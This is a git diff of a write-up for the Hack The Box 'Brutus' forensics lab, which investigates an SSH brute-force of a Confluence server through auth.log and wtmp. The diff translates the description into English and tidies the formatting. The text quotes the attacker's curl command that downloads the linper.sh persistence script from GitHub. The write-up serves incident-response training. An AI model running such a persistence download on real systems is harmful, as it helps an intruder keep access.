@@ -1,6 +1,6 @@
 ---
 title: Brutus
-description: En este Sherlock, te familiarizarás con los registros auth.log y wtmp de Unix. Exploraremos un escenario en el que un servidor Confluence fue atacado por fuerza bruta a través de su servicio SSH. Después de obtener acceso al servidor, el atacante realizó actividades adicionales, que podemos rastrear usando auth.log. Aunque auth.log se usa principalmente para el análisis por fuerza bruta, profundizaremos en todo el potencial de este artefacto en nuestra investigación, incluidos aspectos de escalada de privilegios, persistencia e incluso cierta visibilidad en la ejecución de comandos.
+description: In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
 date: 2024-07-03
 toc: true
 pin: false
@@ -268,7 +268,7 @@ Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for
 Este comando descargó el script linper.sh desde una URL de GitHub usando 'curl'.
 
 > **`A8.`** **/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh**
- 
+
 ---
 ### Timeline
 
@@ -291,4 +291,3 @@ Este comando descargó el script linper.sh desde una URL de GitHub usando 'curl'
 
 > <a href="https://labs.hackthebox.com/achievement/sherlock/1521382/631" target="_blank">***Litio7 has successfully solved Brutus from Hack The Box***</a>
 {: .prompt-info style="text-align:center" }
-{: .prompt-tip}
